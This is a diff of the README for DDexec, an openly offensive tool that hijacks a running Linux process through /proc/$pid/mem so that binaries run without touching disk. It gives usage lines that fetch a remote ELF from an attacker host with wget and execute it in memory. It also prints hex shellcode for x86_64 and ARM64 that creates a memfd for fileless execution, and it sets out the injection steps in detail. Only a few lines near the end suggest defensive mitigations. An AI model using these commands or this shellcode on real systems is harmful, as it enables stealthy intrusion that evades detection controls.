@@ -1,22 +1,26 @@
-# DDexec
+# DDexec news
+I have updated DDexec so much it is barely recognizable, the parsing of the ELF is now done by machine code instead of by the shell script, making it far faster, reliable and comprehensible. It has also reduced its number of dependencies to the absolute minimum.
+
+It also now barely depends on the shell's arithmetic, [which may make it work on Android](https://github.com/arget13/DDexec/issues/13).
+
 ## Context
 In Linux in order to run a program it must exist as a file, it must be accessible in some way through the file system hierarchy (this is just how `execve()` works). This file may reside on disk or in ram (tmpfs, memfd) but you need a filepath. This has made very easy to control what is run on a Linux system, it makes easy to detect threats and attacker's tools or to prevent them from trying to execute anything of theirs at all (_e. g._ not allowing unprivileged users to place executable files anywhere).
 
-But this technique is here to change all of this. If you can not start the process you want... then you hijack one already existing.
+Well, if you cannot start the process you want... then you hijack and torture one already existing until it pleases your desires.
 
 ## Usage
-Pipe into the `ddexec.sh` script the base64 of the binary you want to run (**without** newlines). The arguments for the script are the arguments for the program (starting with `argv[0]`).
+Pipe into the `ddexec.sh` script the binary you want to run. The arguments for the script are the arguments for the program (starting with `argv[0]`).
 
 Here, try this:
 ```
-base64 -w0 /bin/ls | bash ddexec.sh ls -lA
+bash ddexec.sh ls -lA < /bin/ls
 ```
 which is easily weaponizable with something like
 ```
-wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
+wget -O- https://attacker.com/binary.elf | bash ddexec.sh argv0 foo bar
 ```
 
-There is also the `ddsc.sh` script that allows you to run binary code directly.
+There is also the `ddsc.sh` script that allows you to run machine code directly.
 The following is an example of the use of a shellcode that will create a memfd (a file descriptor pointing to a file in memory) to which we can later write binaries and run them, from memory obviously.
 ```
 bash ddsc.sh -x <<< "68444541444889e74831f64889f0b401b03f0f054889c7b04d0f05b0220f05" &
@@ -24,12 +28,10 @@ cd /proc/$!/fd
 wget -O 4 https://attacker.com/binary.elf
 ./4
 ```
-In ARM64 the process is similar, only the shellcode changes
+In ARM64 the process is the same.
 ```
 bash ddsc.sh -x <<< "802888d2a088a8f2e00f1ff8e0030091210001cae82280d2010000d4c80580d2010000d4881580d2010000d4610280d2281080d2010000d4"
 ```
-
-And yes. It works with meterpreter.
 
 Tested Linux distributions are Debian, Alpine and Arch. Supported shells are bash, zsh and ash (busybox); on x86_64 and aarch64 (arm64) architectures.
 
@@ -56,19 +58,12 @@ Block this, EDRs.
 ## Dependencies
 This script depends on the following tools to work.
 ```
-tail | dd | hexdump | any other program that allows us to seek through a fd
 bash | zsh | ash (busybox)
-head
-tail
-cut
-grep
-od
-readlink
-wc
-tr
-basename
-base64
+tail | dd | hexdump | cmp | xxd | any other program that allows us to seek through a fd
 ```
+**In the case of ash**, tail, dd, hexdump, cmp and xxd are built-ins, so they aren't actually a dependency.
+
+Note: It only works on modern versions of busybox, not sure of the oldest version, haven't looked it up. I know it works on v1.35.0, but it doesn't on v1.30.0.
 
 ## The technique
 If you are able to modify arbitrarily the memory of a process then you can take over it. This can be used to hijack an already existing process and replace it with another program. We can achieve this either by using the `ptrace()` syscall (which requires you to have the ability to execute syscalls or to have gdb available on the system) or, more interestingly, writing to `/proc/$pid/mem`.
@@ -87,32 +82,35 @@ But we have clever solutions:
 
 ### In more detail
 The steps are relatively easy and do not require any kind of expertise to understand them:
-* Parse the binary we want to run and the loader to find out what mappings they need. Then craft a *shell*code that will perform, broadly speaking, the same steps that the kernel does upon each call to `execve()`:
-    * Create said mappings.
+* Obtain from `/proc/$pid/syscall` the address the process will return to after the syscall it is currently executing —since we are reading this file said syscall will be read(), and the address will be in the read() wrapper of the libc. This is just to get a place where our stager will be found shortly.
+* Overwrite that place, which will be executable, with a stager (through `mem` we can modify unwritable pages). Said stager will read and execute a larger shellcode.
+* This shellcode will, broadly speaking, perform the same steps that the kernel does upon each call to `execve()`:
+    * Parse the binary, find what loader it needs, and the mappings they both need.
+    * Create the mappings they need.
     * Read the binaries into them.
     * Set up permissions.
     * Finally initialize the stack with the arguments for the program and place the auxiliary vector (needed by the loader).
     * Jump into the loader and let it do the rest (load and link libraries needed by the program).
-* Obtain from the `syscall` file the address to which the process will return after the syscall it is currently executing.
-* Overwrite that place, which will be executable, with our shellcode (through `mem` we can modify unwritable pages).
-* Pass the program we want to run to the stdin of the process (will be `read()` by said *shell*code).
-* At this point it is up to the loader to load the necessary libraries for our program and jump into it.
 
-Oh, and all of this must be done in s**hell** scripting, or what would be the point?
+The shellcode has been generated by compiling loader.c, and tweaking its assembly to remove and simplify lots of artifacts introduced by the compiler.
 
 ## Contribute
-Well, there are a couple of TODOs. Besides this, you may have noticed that I do not know much about shell scripting (I am more of a C programmer myself) and I am sure I must have won a decade worth of ["useless use of a cat"](https://porkmail.org/era/unix/award.html) awards (no cats were harmed in the making of this tool) and the rest of variants just with a fraction of this project.
+Well, there are a couple of TODOs. Besides this, you may have noticed that I do not know much about shell scripting (I am more of a C programmer myself) and I am sure I must have won a decade worth of ["useless use of a cat"](https://porkmail.org/era/unix/award.html) awards —no cats were harmed in the making of this tool— and the rest of variants just with a fraction of this project.
 
-- Improve code style and performance.
-- Port to other shells.
-- Allow run the program with a non-empty environment.
+— Port to other shells —in the limit we should make the script POSIX compliant.
+- Allow to run the program with a non-empty environment.
+- Load also in a fileless manner the loader for the program, in case it isn't on the target system (it may be a distribution with musl, for example, like alpine).
+- And also allow to load (filelessly, of course) from another source the libraries needed, in case they aren't on the system (it may even be distroless and not have any library at all). For this, [memdlopen](https://github.com/arget13/memdlopen/) is probably the way.
+- ddsc.sh needs a bit of an update.
 
-Anyway, **all contribution is welcome**. Feel free to fork and PR.
+Anyway, feel free to fork and PR. But please, when contributing take into account that PRs that make it not work on the supported shells will not be accepted, that is not contributing, that is just breaking stuff. It would be best if your changes are POSIX compliant.
+
+Just... please, please, _please_, check your code and see if it does work on the supported shells at least on Debian and Alpine. It's just a couple of dockers.
 
 ## Credit
-Recently I have come to know that [Sektor7](https://www.sektor7.net) had already [published](https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md) this almost-exact same technique on their blog a few years ago.
+After publishing this tool I came to know that [Sektor7](https://www.sektor7.net) had already [published](https://blog.sektor7.net/#!res/2018/pure-in-memory-linux.md) this almost-exact same technique on their blog a few years ago.
 
-Despite this, I thought this technique independently in, now almost, its entirety. Probably the smarter piece of this technique is the use of the inherited file descriptor, idea provided by [David Buchanan](https://github.com/DavidBuchanan314) (inspired, I think, by Sektor7's blog) almost a year before I even started thinking about this topic. This alone not only makes the technique much simpler and neat, it also makes it far deadlier by eliminating the need to disable ASLR. His [tweet](https://twitter.com/David3141593/status/1386661837073174532) also made me realize how *stupid* I was for not noticing that `mem` allowed to write to non-writable pages, hence making the ROP unnecessary... This ultimately also has the desired effect of making this significantly easier to port to other ISAs.
+Despite this, I thought this technique independently in, now almost, its entirety. Probably the smarter piece of this technique is the use of the inherited file descriptor, idea [provided](https://twitter.com/David3141593/status/1386661837073174532) by [David Buchanan](https://github.com/DavidBuchanan314) (inspired by Sektor7's blog) almost a year before I even started thinking about this topic. This alone not only makes the technique much simpler and neat, it also makes it far deadlier by eliminating the need to disable ASLR.
 
 Either way, I hope I will be able to spread this technique much further, which is what matters.
 
@@ -120,9 +118,9 @@ I would like to thank [Carlos Polop](https://github.com/carlospolop), a great pe
 
 ## Now what?
 You may:
-- Go distroless.
+- Go distroless. Well, in [certain scenarios](https://github.com/arget13/memexec/) it may not protect you at all.
 - Use a kernel compiled without support for the `mem` file.
-- Detect any program opening or writing to the `mem` file.
+- Don't mount procfs.
 
 ## Questions? Death threats?
-Feel free to send me an email to [yagogl@protonmail.com](mailto:yagogl@protonmail.com) or to contact me through [Twitter](https://twitter.com/arget1313).
+You can reach me through [Twitter](https://twitter.com/arget1313).
